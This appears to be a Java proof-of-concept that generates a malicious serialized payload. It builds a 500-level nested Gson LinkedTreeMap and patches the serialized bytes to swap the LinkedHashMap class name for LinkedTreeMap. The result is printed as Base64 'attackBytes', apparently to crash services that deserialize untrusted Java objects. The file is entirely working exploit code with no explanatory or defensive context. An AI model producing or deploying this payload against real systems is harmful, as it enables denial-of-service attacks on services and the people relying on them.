package com.example;

import com.google.gson.internal.LinkedTreeMap;

import java.io.*;
import java.util.Base64;

public class input {

    public static void main(String[] args) throws Exception {

      
        // Build 500-level deep LinkedTreeMap
        //System.out.println("[*] Building 500-level deep LinkedTreeMap...");

        LinkedTreeMap<String, Object> root = new LinkedTreeMap<>();
        LinkedTreeMap<String, Object> current = root;

        for (int i = 0; i < 500; i++) {
            LinkedTreeMap<String, Object> child = new LinkedTreeMap<>();
            child.put("level", i);
            current.put("child", child);
            current = child;
        }


        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(root);
        oos.close();
        byte[] rawBytes = baos.toByteArray();

     
        //System.out.println("[*] Patching bytes — replacing LHM with LTM...");

        String oldName = "java.util.LinkedHashMap";                
        String newName = "com.google.gson.internal.LinkedTreeMap"; 

        String raw = new String(rawBytes, "ISO-8859-1");
        int idx = raw.indexOf(oldName);

        if (idx == -1) {
            //System.out.println("[!] Could not find LHM in bytes. Exiting.");
            return;
        }

      
        rawBytes[idx - 2] = (byte) ((newName.length() >> 8) & 0xFF);
        rawBytes[idx - 1] = (byte) (newName.length() & 0xFF);

        
        ByteArrayOutputStream result = new ByteArrayOutputStream();
        result.write(rawBytes, 0, idx);
        result.write(newName.getBytes("ISO-8859-1"));
        result.write(rawBytes, idx + oldName.length(),
                rawBytes.length - idx - oldName.length());

        byte[] attackBytes = result.toByteArray();

        String patched = new String(attackBytes, "ISO-8859-1");
        //System.out.println("    Contains LTM : " + patched.contains("LinkedTreeMap")); 
        //System.out.println("    Contains LHM : " + patched.contains("LinkedHashMap")); 
        //System.out.println("    Payload size : " + attackBytes.length + " bytes");

     
        String base64 = Base64.getEncoder().encodeToString(attackBytes);

        System.out.println(base64);
        
    }
}